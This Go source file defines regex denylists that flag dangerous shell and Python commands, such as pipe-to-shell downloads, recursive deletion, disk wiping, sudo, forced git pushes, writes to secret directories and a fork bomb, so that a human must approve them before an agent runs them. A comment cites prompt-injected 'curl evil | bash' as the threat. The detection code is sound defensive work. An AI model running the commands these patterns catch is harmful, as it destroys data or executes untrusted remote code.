package utils

import "regexp"

// Dangerous-command detection backing the human confirmation gate (see
// RequestApproval). This is a conservative denylist of irreversible and
// high-blast-radius operations, NOT a security boundary: bash is
// unsandboxed by design (doc: R15) and any string match is bypassable. It
// exists so that a prompt-injected `curl evil | bash` or `rm -rf ~` pauses
// for a human before it runs instead of executing silently. False positives
// cost one keypress; false negatives are the danger, so patterns err toward
// matching more.

var dangerousShellPatterns = []*regexp.Regexp{
	// Remote content piped directly into a shell, or a command substitution
	// that fetches a URL.
	regexp.MustCompile(`(?i)\b(?:curl|wget|fetch)\b[^|;&]*\|\s*(sudo\s+)?(ba)?sh\b`),
	regexp.MustCompile(`(?i)\$\([^)]*(curl|wget|fetch)\b`),

	// Recursive / forced deletion, and deletion targeting the root or home.
	regexp.MustCompile(`(?i)\b(?:sudo\s+)?rm\b(?:[ \t]+(?:-[a-z]*[rf][a-z]*|--(?:recursive|force|no-preserve-root)))+`),
	regexp.MustCompile(`(?i)\b(?:sudo\s+)?rm\b[ \t]+(?:/|~|\$HOME)(?:[ \t]|$)`),
	regexp.MustCompile(`(?i)\b(?:sudo\s+)?rmdir\b`),

	// Raw disk / filesystem manipulation.
	regexp.MustCompile(`(?i)\b(?:mkfs\.[a-z0-9]+|wipefs|fdisk|parted|sfdisk|blkdiscard)\b`),
	regexp.MustCompile(`(?i)\bdd\b[^;&|]*of=/dev/`),

	// System power control.
	regexp.MustCompile(`(?i)\b(?:shutdown|reboot|halt|poweroff)\b`),
	regexp.MustCompile(`(?i)\b(?:init\s+[06]|systemctl\s+(?:poweroff|reboot|halt))\b`),

	// Privilege escalation.
	regexp.MustCompile(`(?i)\bsudo\b`),

	// Irreversible git history / remote rewrites.
	regexp.MustCompile(`\bgit\s+(?:reset\s+--hard|clean\s+-[a-z]*f[a-z]*|push\s+(?:-f\b|--force|--delete|--force-with-lease))`),

	// Recursive ownership / permission changes.
	regexp.MustCompile(`(?i)\b(?:sudo\s+)?chmod\b[ \t]+(?:-R|--recursive|777|a\+w|u?g?o?\+w)(?:[ \t]|$)`),
	regexp.MustCompile(`(?i)\b(?:sudo\s+)?chown\b[ \t]+(?:-R|--recursive)(?:[ \t]|$)`),

	// Redirection that overwrites a system or secret path.
	regexp.MustCompile(`(?i)>>?\s*(?:/etc/|/usr/|/boot/|/var/|/root/|/bin/|/sbin/|/lib/)`),
	regexp.MustCompile(`(?i)>>?\s*\S*(?:\.ssh|\.gnupg|\.aws|\.config/sops|agenix)\S*`),

	// Classic fork bomb.
	regexp.MustCompile(`:\(\)\s*\{`),
}

var dangerousPythonPatterns = []*regexp.Regexp{
	// Actual shell / code execution calls; merely importing subprocess or
	// naming an API should not interrupt ordinary scripts with an approval.
	regexp.MustCompile(`\bsubprocess\s*\.\s*(?:run|Popen|call|check_call|check_output|getoutput|getstatusoutput)\s*\(`),
	regexp.MustCompile(`\b(?:os\s*\.\s*(?:system|popen|exec\w*)|Popen)\s*\(`),
	regexp.MustCompile(`\b(?:__import__|eval|exec)\s*\(`),
	// Irreversible recursive deletion.
	regexp.MustCompile(`\bshutil\s*\.\s*rmtree\s*\(`),
}

// IsDangerousCommand reports whether a shell command matches the high-risk
// denylist and should be confirmed by a human before it runs.
func IsDangerousCommand(s string) bool {
	for _, re := range dangerousShellPatterns {
		if re.MatchString(s) {
			return true
		}
	}
	return false
}

// IsDangerousPython reports whether Python source matches the high-risk
// denylist (arbitrary execution or irreversible recursive deletion).
func IsDangerousPython(s string) bool {
	for _, re := range dangerousPythonPatterns {
		if re.MatchString(s) {
			return true
		}
	}
	return false
}
